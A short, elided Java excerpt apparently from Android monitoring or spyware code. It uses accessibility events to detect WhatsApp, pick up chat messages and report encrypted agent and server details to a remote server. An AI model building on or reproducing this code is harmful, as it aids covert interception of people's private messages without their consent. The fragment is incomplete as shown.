                ...
                if (event.getPackageName().toString().contains("whatsapp"))
                {
                    ...
                    if (nodeInfo.getViewIdResourceName().toString().contains(":id/date"))
                    {
                        if (Utilities.finalChatMessage != null && Utilities.finalChatMessage.length() > 3)
                        {
                            ...
                            Utilities.reportOnline(Cryptography.encrypt(Settings.agentID(context)), Cryptography.encrypt(android.os.Build.VERSION.RELEASE), Cryptography.encrypt(Settings.agentVersion()), Cryptography.encrypt(Settings.serverPassword(context)), Cryptography.encrypt(Settings.companyDomain(context)));
